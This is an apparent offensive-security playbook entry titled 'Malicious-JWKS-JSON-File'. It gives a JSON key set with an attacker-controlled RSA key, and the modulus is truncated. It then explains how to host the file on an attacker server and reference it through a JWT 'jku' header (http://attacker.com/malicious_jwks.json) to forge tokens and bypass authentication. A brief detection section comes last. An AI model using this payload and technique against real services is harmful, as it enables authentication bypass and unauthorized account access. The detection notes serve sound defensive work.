---
id: e30b92a1-0b55-4117-9f14-0e31d7f1e19d
name: Malicious-JWKS-JSON-File
type: code
language: json
verified: true
created_at: '2023-04-06T03:56:00.821144+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Web
tags:
  - jwks
  - jwt
  - key-injection
validated: true
---

# Malicious-JWKS-JSON-File

## Code

```json
{
    "keys": [
        {
            "kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
            "kty": "RSA",
            "e": "AQAB",
            "n": "nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ"
        }
    ]
}
```

## Description

This JSON represents a malicious JWKS file containing an attacker-controlled RSA public key. When referenced via the 'jku' header in a JWT, it allows the target service to verify tokens signed with the corresponding private key, enabling authentication bypass.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `kid` | Key ID to match the JWT header | `beaefa6f-8a50-42b9-805a-0ab63c3acc54` |
| `kty` | Key type (RSA) | `RSA` |
| `e` | Base64url-encoded exponent | `AQAB` |
| `n` | Base64url-encoded modulus from public key | `nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ` |

## Usage

Save as `malicious_jwks.json` and host on an attacker server (e.g., via Python HTTP server). Reference in JWT 'jku' header: `{"jku": "http://attacker.com/malicious_jwks.json"}`. Used in procedures like [[procedures/JWKS-Key-Injection-for-JWT-Forgery]] to forge tokens.

## Detection

- Log and alert on 'jku' headers with external/unexpected domains.
- Monitor HTTP fetches to unusual JWKS endpoints.
- Validate JWKS 'kid' against known keys; block mismatches.

## Related

- [[procedures/JWKS-Key-Injection-for-JWT-Forgery]]
- [[tools/Python]]
